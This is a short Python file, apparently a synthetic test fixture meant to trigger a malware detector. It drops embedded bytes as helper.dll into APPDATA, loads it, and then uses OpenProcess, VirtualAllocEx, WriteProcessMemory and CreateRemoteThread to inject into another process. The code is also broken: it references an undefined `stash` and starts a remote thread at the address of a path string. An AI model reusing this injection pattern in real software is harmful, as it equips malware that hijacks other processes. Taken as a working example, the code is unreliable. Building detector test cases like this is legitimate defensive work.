import ctypes
import os

# Synthetic staged-loader control: embedded PE bytes under novel module
# names (never the original sample's spellings), dropped to APPDATA,
# loaded, then executed in a remote process. The tightened hostile must
# still fire here via the execution-transfer leg.
from stash import blob


def stage_and_inject(pid):
    path = "%s\\helper.dll" % os.getenv("APPDATA")
    with open(path, "wb") as handle:
        handle.write(bytes(stash.blob))
    lib = ctypes.WinDLL(path)
    entry = lib.RunStage
    kernel32 = ctypes.windll.kernel32
    proc = kernel32.OpenProcess(0x1F0FFF, False, pid)
    addr = kernel32.VirtualAllocEx(proc, None, 4096, 0x3000, 0x40)
    kernel32.WriteProcessMemory(proc, addr, path, len(path), None)
    kernel32.CreateRemoteThread(proc, None, 0, addr, None, 0, None)
    return addr
